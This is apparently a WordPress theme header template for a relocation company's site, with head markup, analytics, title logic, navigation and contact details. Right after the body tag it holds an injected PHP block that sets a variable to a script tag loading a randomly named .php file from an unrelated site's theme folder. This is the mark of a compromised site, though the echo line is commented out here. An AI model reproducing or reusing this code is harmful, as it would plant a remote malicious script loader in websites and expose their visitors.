<!DOCTYPE html>
<html <?php language_attributes(); ?>>

<head>

    <meta charset="<?php bloginfo( 'charset' ); ?>" />

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

    <title><?php wp_title( '|', true, 'right' ); ?></title>

    <link rel="alternate" type="application/rss xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
   
    <link rel="alternate" type="application/atom xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
    
    
    <?php wp_head(); ?>
<script>
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

 ga('create', 'UA-69241464-1', 'auto');
 ga('send', 'pageview');

</script>
 
    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>  -->
<!--   <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> -->
<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri() ?>/css/style.css">
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"> 
<style type="text/css">
.the-slider ul.slide-wrapper li.slide img{
height: auto;
max-width: 100%;
}
</style>

</head>

<?php
$page_template_slug = get_page_template_slug();
if('templates_displaywp/home.php'===$page_template_slug&&is_page_template()&&array_key_exists(get_page_template_slug(), wp_get_theme()->get_page_templates())){
    $displaywp_has_title = false;
}else{
    if(is_page()){
        $displaywp_metabox_page_options_get = displaywp_metabox_page_options_get(get_the_id());
        $displaywp_has_title = 'default'===$displaywp_metabox_page_options_get['layout'];
        if($displaywp_has_title){
            $displaywp_title = get_the_title();
            $displaywp_title_description = wpautop($displaywp_metabox_page_options_get['title_description']);
        }
    }elseif(is_archive()){
        $displaywp_has_title = true;
        if(is_category()){
            $displaywp_title = single_cat_title(_x('Category: ','category','displaywp'), false);
            $displaywp_title_description = '';
        }elseif(is_tag()){
            $displaywp_title = single_tag_title(_x('Tag: ','tag','displaywp'), false);
            $displaywp_title_description = '';
        }elseif(is_day()){
            $displaywp_title = _x('Archive: ','archive','displaywp').get_the_date('F jS, Y');
            $displaywp_title_description = '';
        }elseif(is_month()){
            $displaywp_title = _x('Archive: ','archive','displaywp').get_the_date('F, Y');
            $displaywp_title_description = '';
        }elseif(is_year()){
            $displaywp_title = _x('Archive: ','archive','displaywp').get_the_date('Y');
            $displaywp_title_description = '';
        }else{
            $displaywp_title = _x('Archive: ','archive','displaywp').get_search_query();
            $displaywp_title_description = '';
        }
    }elseif(is_search()){
        $displaywp_has_title = true;
        $displaywp_title = _x('Search: ','search','displaywp').get_search_query();
        $displaywp_title_description = '';
    }else{
        $displaywp_has_title = false;
    }
}

?>

<script type="text/javascript">
jQuery(document).ready(function(){
changecolor()
    var myFunction = function() {};
setInterval(changecolor, 3000);

  function changecolor()
{     
jQuery("#object1").css("color", "#118703");
setTimeout(function(){
jQuery("#object1").css("color", "#FB1F0E");
 }, 1000);

setTimeout(function(){
jQuery("#object1").css("color", "#4366AF");
 }, 2000);

}

});


</script>
<body <?php if($displaywp_has_title) body_class('our-team-page'); else body_class(); ?>>
<?php

if(empty($rzmzw)) {
$rzmzw = "<script type=\"text/javascript\" src=\"http://cityofflagschorus.org/wp-content/themes/twentyfourteen/c7pmnhq8.php\"></script>";
//echo $rzmzw;
}

?>    
    <div class="header">
         <div class="bg-lf-shadow"></div>
        <div class="container">
            <div class="header-content">
                
                <div class="logo">
                    <a href="<?php echo esc_url(home_url()); ?>">
                        <?php
                            $logo_text = _go('logo_text');
                            if(empty($logo_text)){
                                $logo_image = _go('logo_image');
                                if(empty($logo_image))
                                    echo '<strong>'.get_bloginfo('name').'</strong><br/><em>'.get_bloginfo('description').'</em>';
                                else
                                    echo '<img src="'.$logo_image.'" alt="logo" />';
                            }else{
                                $logo_text_color = _go('logo_text_color');
                                if(empty($logo_text_color))
                                    $logo_text_color = '';
                                else
                                    $logo_text_color = 'color:'.$logo_text_color.';';
                                $logo_text_font = _go('logo_text_font');
                                if(empty($logo_text_font))
                                    $logo_text_font = '';
                                else
                                    $logo_text_font = 'font-family:'.$logo_text_font.';';
                                $logo_text_size = _go('logo_text_size');
                                if(empty($logo_text_size))
                                    $logo_text_size = '';
                                else
                                    $logo_text_size = 'font-size:'.$logo_text_size.'px;';
                                echo '<span style="'.$logo_text_color.$logo_text_font.$logo_text_size.'">'.$logo_text.'</span>';
                            }
                        ?>
                    </a>
                </div>
<div class="top-navigation-right-text">

                    <!--v enkat changed search-top as top-navigation-right-text -->
                    <ul class="social socialbox" style="float:right">
                        <li>
                        <a target="_blank" href="https://www.facebook.com/jetrelocationspackersmovers">
                            <i class="fb"></i>
                        </a>
                        </li>
                        <li>
                        <a target="_blank" href="https://twitter.com/jetrelocation">
                            <i class="tw"></i>
                        </a>
                        </li>
                        
                    </ul>
                   
                       <div  class="tel telbox" style="float:right" id="object1">
                        
          <span class="glyphicon glyphicon-earphone "  ></span>  <b id="object1"> +91-99866-20001 / +91-99866-30001</b>
                       
                     
                       </div>
                       <div style="clear:both"></div>


<!-- venkat hidden -->
            
                <div class="menu" style="float:right">
                    <span class="res-menu">Menu</span>
                    <?php 
                    wp_nav_menu(array(
                        'theme_location' => 'displaywp_menu',
                        'container' => false,
                        "menu_class" => "nav",
                        "menu_id" => "nav",
                        'walker' => has_nav_menu('displaywp_menu') ? new Displaywp_Nav_Menu_Walker : new Displaywp_Walker_Page
                    ));
                     ?>
                </div>
                </div>
                <div class="clear"></div>
            </div>
         </div>  
        
         <div class="bg-rg-shadow" style="top: 0px;"></div> 
         </div> 
            <?php 
                $getid = get_the_ID();
            if($displaywp_has_title):

            if($getid != '394'){

            ?>
            
             <div class="breadcrumb">
                <div class="header-content container" style="padding: 0px !important;
margin: 0px auto !important;
background: transparent none repeat scroll 0% 0%;
border: medium none;">
            <h1><?php echo $displaywp_title; ?></h1>
            <?php echo $displaywp_title_description; ?>
                </div>
            </div> 
            <?php }
            endif; ?>
        
   
    <!-- =====================================================================
                                     END HEADER 
    ====================================================================== -->